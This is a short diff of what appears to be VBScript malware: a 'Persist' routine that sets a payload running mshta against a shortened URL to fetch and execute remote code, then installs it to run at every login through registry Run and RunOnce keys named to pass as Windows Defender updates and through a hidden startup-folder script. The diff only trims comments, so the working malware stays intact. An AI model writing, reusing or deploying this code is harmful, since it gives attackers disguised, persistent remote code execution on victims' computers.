@@ -26,13 +26,13 @@ End Sub
 Sub Persist()
     Dim payload: payload = "mshta https://tinyurl.com/436kk33s"
 
-    ' Registry Run — fires on every login
+    ' Registry Run
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
 
-    ' Registry RunOnce — fires next login as backup
+    ' Registry RunOnce
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
 
-    ' Startup folder VBS — fires on every login
+    ' Startup folder VBS
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://tinyurl.com/436kk33s"", 0, False"
